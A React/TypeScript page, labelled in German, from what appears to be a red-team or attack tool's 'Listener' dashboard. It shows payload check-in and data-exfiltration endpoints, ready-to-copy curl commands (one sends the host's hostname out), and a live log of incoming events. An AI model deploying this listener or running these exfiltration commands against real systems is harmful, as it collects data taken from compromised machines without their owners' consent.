import { useEffect, useState, useCallback } from 'react';
import { Radio, Copy, Check, RefreshCw, Wifi, Database } from 'lucide-react';
import api from '../api/client';

interface ListenerEvent {
  id: number;
  action: 'payload_checkin' | 'data_exfil';
  target: string;
  details: string;
  ip_address: string;
  timestamp: string;
}

interface EventsResponse {
  events: ListenerEvent[];
  total: number;
  pages: number;
  current_page: number;
}

const BASE_URL = window.location.origin;

const ENDPOINTS = [
  {
    label: 'Check-in',
    icon: Wifi,
    color: 'text-emerald-400',
    bg: 'bg-emerald-400/10 border-emerald-400/30',
    url: `${BASE_URL}/api/l/checkin/<identifier>`,
    curl: `curl -X POST ${BASE_URL}/api/l/checkin/payload_v1`,
    description: 'Empfängt GET/POST Check-ins von Remote-Payloads.',
  },
  {
    label: 'Exfiltration',
    icon: Database,
    color: 'text-rose-400',
    bg: 'bg-rose-400/10 border-rose-400/30',
    url: `${BASE_URL}/api/l/exfil/<label>`,
    curl: `curl -X POST ${BASE_URL}/api/l/exfil/host -d "$(hostname)"`,
    description: 'Empfängt kleine Datenpakete (Hostname, whoami, etc.).',
  },
];

const ACTION_STYLES: Record<string, string> = {
  payload_checkin: 'bg-emerald-400/10 text-emerald-400 border border-emerald-400/30',
  data_exfil: 'bg-rose-400/10 text-rose-400 border border-rose-400/30',
};

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = async () => {
    await navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button
      onClick={handleCopy}
      className="p-1.5 rounded hover:bg-white/10 transition-colors"
      title="In Zwischenablage kopieren"
    >
      {copied
        ? <Check size={14} className="text-emerald-400" />
        : <Copy size={14} className="text-slate-400" />}
    </button>
  );
}

export default function Listener() {
  const [events, setEvents] = useState<ListenerEvent[]>([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [pages, setPages] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [lastRefresh, setLastRefresh] = useState<Date | null>(null);

  const fetchEvents = useCallback(async (p: number) => {
    setLoading(true);
    setError(null);
    try {
      const res = await api.get<EventsResponse>('/api/l/events', {
        params: { page: p, per_page: 25 },
      });
      setEvents(res.data.events);
      setTotal(res.data.total);
      setPages(res.data.pages);
      setPage(res.data.current_page);
      setLastRefresh(new Date());
    } catch {
      setError('Verbindung zum Backend fehlgeschlagen.');
    } finally {
      setLoading(false);
    }
  }, []); // no external deps — p is always passed explicitly

  // Initial load + auto-refresh every 10 s
  useEffect(() => {
    fetchEvents(1);
    const id = setInterval(() => fetchEvents(1), 10_000);
    return () => clearInterval(id);
  }, [fetchEvents]);

  return (
    <div className="space-y-8">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <Radio className="text-indigo-400" size={28} />
          <div>
            <h1 className="text-2xl font-bold text-white">Listener</h1>
            <p className="text-slate-400 text-sm">
              Callback- &amp; Exfiltrations-Endpunkte · Auto-Refresh alle 10 s
            </p>
          </div>
        </div>
        <button
          onClick={() => fetchEvents(page)}
          disabled={loading}
          className="flex items-center gap-2 px-3 py-2 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-300 text-sm transition-colors disabled:opacity-50"
        >
          <RefreshCw size={14} className={loading ? 'animate-spin' : ''} />
          {lastRefresh ? lastRefresh.toLocaleTimeString() : 'Aktualisieren'}
        </button>
      </div>

      {/* Endpoint cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {ENDPOINTS.map(ep => {
          const Icon = ep.icon;
          return (
            <div
              key={ep.label}
              className={`rounded-xl border p-5 space-y-4 ${ep.bg}`}
            >
              <div className="flex items-center gap-2">
                <Icon size={18} className={ep.color} />
                <span className={`font-semibold ${ep.color}`}>{ep.label}</span>
              </div>
              <p className="text-slate-300 text-sm">{ep.description}</p>

              <div>
                <p className="text-xs text-slate-500 mb-1 uppercase tracking-wide">Endpoint</p>
                <div className="flex items-center gap-2 bg-slate-900/60 rounded-lg px-3 py-2">
                  <code className="text-xs text-slate-300 flex-1 break-all">{ep.url}</code>
                  <CopyButton text={ep.url} />
                </div>
              </div>

              <div>
                <p className="text-xs text-slate-500 mb-1 uppercase tracking-wide">curl Beispiel</p>
                <div className="flex items-center gap-2 bg-slate-900/60 rounded-lg px-3 py-2">
                  <code className="text-xs text-slate-300 flex-1 break-all">{ep.curl}</code>
                  <CopyButton text={ep.curl} />
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Events feed */}
      <div className="rounded-xl border border-slate-700 bg-slate-800/50">
        <div className="flex items-center justify-between px-5 py-4 border-b border-slate-700">
          <h2 className="font-semibold text-white">
            Events
            <span className="ml-2 text-sm text-slate-400">({total} gesamt)</span>
          </h2>
        </div>

        {error && (
          <div className="px-5 py-4 text-rose-400 text-sm">{error}</div>
        )}

        {!error && events.length === 0 && !loading && (
          <div className="px-5 py-8 text-center text-slate-500 text-sm">
            Noch keine Events. Sende einen Check-in oder Exfil-Request.
          </div>
        )}

        {events.length > 0 && (
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="text-left text-slate-400 border-b border-slate-700">
                  <th className="px-5 py-3 font-medium">Aktion</th>
                  <th className="px-5 py-3 font-medium">Ziel</th>
                  <th className="px-5 py-3 font-medium">IP</th>
                  <th className="px-5 py-3 font-medium">Details</th>
                  <th className="px-5 py-3 font-medium">Zeitstempel</th>
                </tr>
              </thead>
              <tbody>
                {events.map(ev => (
                  <tr
                    key={ev.id}
                    className="border-b border-slate-700/50 hover:bg-slate-700/30 transition-colors"
                  >
                    <td className="px-5 py-3">
                      <span className={`px-2 py-0.5 rounded text-xs font-medium ${ACTION_STYLES[ev.action] ?? 'bg-slate-700 text-slate-300'}`}>
                        {ev.action}
                      </span>
                    </td>
                    <td className="px-5 py-3 text-slate-300 font-mono">{ev.target}</td>
                    <td className="px-5 py-3 text-slate-400 font-mono">{ev.ip_address ?? '—'}</td>
                    <td className="px-5 py-3 text-slate-400 max-w-xs truncate" title={ev.details}>
                      {ev.details}
                    </td>
                    <td className="px-5 py-3 text-slate-500 whitespace-nowrap">
                      {new Date(ev.timestamp).toLocaleString()}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* Pagination */}
        {pages > 1 && (
          <div className="flex items-center justify-center gap-2 px-5 py-4 border-t border-slate-700">
            <button
              disabled={page <= 1}
              onClick={() => fetchEvents(page - 1)}
              className="px-3 py-1.5 rounded bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs disabled:opacity-40"
            >
              ← Zurück
            </button>
            <span className="text-slate-400 text-xs">Seite {page} / {pages}</span>
            <button
              disabled={page >= pages}
              onClick={() => fetchEvents(page + 1)}
              className="px-3 py-1.5 rounded bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs disabled:opacity-40"
            >
              Weiter →
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
